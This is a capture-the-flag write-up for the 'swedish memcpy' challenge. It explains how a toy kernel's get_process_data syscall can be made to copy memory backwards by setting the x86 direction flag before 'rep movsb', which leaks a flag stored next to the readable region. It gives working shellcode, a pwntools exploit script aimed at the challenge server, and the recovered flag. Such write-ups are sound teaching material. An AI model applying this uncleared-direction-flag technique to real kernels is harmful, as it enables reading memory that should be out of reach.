# swedish memcpy

Solved after the end of the CTF.

I was not able to find the solution until after the event, when someone reminded me of the direction flag.

A solution, heavily based on the author's solution, is documented here for my future reference.

## Challenge

The challenge starts QEMU with a custom disk image which loads a basic kernel.

The kernel reads 0x1000 bytes of program data from serial input and executes it in usermode.

We have 4 syscalls available to us:

| Mnemonic           | RAX | Description                                            |
| ------------------ | --- | ------------------------------------------------------ |
| `exit`             | 0x0 | Shuts down the virtual machhine                        |
| `write`            | 0x1 | Prints a string to the screen                          |
| `readchar`         | 0x2 | Reads one character from serial input                  |
| `get_process_data` | 0x3 | Gets data you're allowed to read from the process data |

The flag is stored in kernel data, but at an address we are not allowed to read from userspace.

## Solution

String data in the kernel is arranged as follows:

```asm
; Strings
flag:
    db "flag{goes_here}", 0
; Data userspace can read freely
allowed_data_base:
    incbin "procdata.json"
    db 0
kernel_source:
    db 0xA
    incbin "kernel.asm"
allowed_data_end:
```

As we can see, the flag is stored immediately before the `allowed_data_base` where we are allowed to read.

Let's look at the source code for the `get_process_data` syscall:

```asm
; Gets data you're allowed to read from the process data
; That includes and the kernel source.
; Arguments:
;   rdi = destination buffer
;   rcx = number of bytes to read
;   rdx = offset into data buffer to read
; Returns:
;   rax = 0 on success
;   rax = EFAULT if the buffer, offset and size combination isn't valid
get_process_data_handler:
    push rsi
    ; Validate destination + size range
    mov rax, EFAULT
    add rcx, rdi
    jc .end ; Fail on overflow
    cmp rcx, userspace_limit
    ja .end ; Fail if too large
    sub rcx, rdi
    ; Validate offset + size
    add rdx, rcx
    jc .end ; Fail on overflow
    cmp rdx, allowed_data_end - allowed_data_base
    ja .end ; Fail if too large
    sub rdx, rcx
    ; All validated, do the copy
    lea rsi, [allowed_data_base + rdx]
    rep movsb
    xor rax, rax
.end:
    pop rsi
    iretq
```

It is checking that the starting offset, number of bytes, and destination pointer are all valid.
Given these checks, we should be unable to read data from outside the allowed area, or write data anywhere other than userspace memory.

The handler uses `rep movsb` to copy data, without checking the direction flag.
Normally, this would increment RSI every iteration.
However, from the Intel 64 and IA-32 Architectures Software Developer's Manual:

> After the move operation, the (E)SI and (E)DI registers are incremented or decremented automatically according to the setting of the DF flag in the EFLAGS register.
> (If the DF flag is 0, the (E)SI and (E)DI register are incremented; if the DF flag is 1, the (E)SI and (E)DI registers are decremented.)
> The registers are incremented or decremented by 1 for byte operations, by 2 for word operations, or by 4 for doubleword operations.

If we set DF using `std`, instructions such as `movsb` will decrement the RSI and RDI registers instead, allowing us to copy backwards.

By setting RDX to 0, we will copy from the start of the allowed data.
With the DF flag set, instead of copying from `program_data`, we will copy from `flag` in reverse order.

RCX should be set to the length we want to copy, which is the length of the flag + 2 (1 for the null byte terminator, 1 because our pointer starts in the first byte of `program_data`).

RDI has to be set to a userspace virtual address such that there is enough space before and after the pointer to store the copied data.
This is because the syscall will check that there is enough space after, which we need to pass, but we will copy into the space before the pointer.
We need to be careful that we do not accidentally overwrite our userspace program data.

Once the flag has been copied into userspace memory, we can clear DF using `cld`.
We can now print the flag to serial output using the `write` syscall.

## Exploit

Shellcode is based on the author's intended solution.

### shellcode.s

```asm
[org 0x0]
[bits 64]

%define FLAG_LEN 0x38

start:

copy_flag:
    std                                        ; set direction flag
    mov rdx, 0                                 ; offset into source buffer
    mov rcx, FLAG_LEN                          ; number of characters to read
    lea rdi, [rel buffer + FLAG_LEN - 1]       ; end of destination buffer
    mov rax, 3                                 ; get_process_data
    int 0x0                                    ; syscall
    cld                                        ; clear direction flag

write_flag:
    lea rsi, [rel buffer]                      ; start of source buffer
    mov rax, 1                                 ; write
    int 0x0                                    ; syscall

exit:
    mov rax, 0                                 ; exit
    int 0x0                                    ; syscall

buffer:
```

### exploit.py

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

host = args.HOST or '54.93.211.13'
port = int(args.PORT or 10001)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return process(['debug.sh'] + argv, *a, **kw)
    else:
        return process(['run.sh'] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    hash_challenge = io.recvline().split()
    if hash_challenge[0] == b'hashcash' and hash_challenge[1] == b'-mb28':
        response = subprocess.run([
            'hashcash',
            '-mb28',
            hash_challenge[2].decode(),
        ], capture_output=True).stdout
        io.send(response)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

shellcode = base64.b64encode(open('shellcode.bin', 'rb').read().ljust(0x1000, b'\x00'))

io = start()
io.sendlineafter(b': ', shellcode)
print(io.recvuntil(b'}'))
```

## Flag

```
kalmar{th15_1s_7h3_m0st_us3fu1_x86_featur3_y3s_1_know}
```
